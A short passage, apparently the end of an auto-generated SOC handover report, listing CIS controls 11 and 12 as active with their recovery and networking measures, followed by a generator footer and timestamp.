| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-16T14:27:27Z_
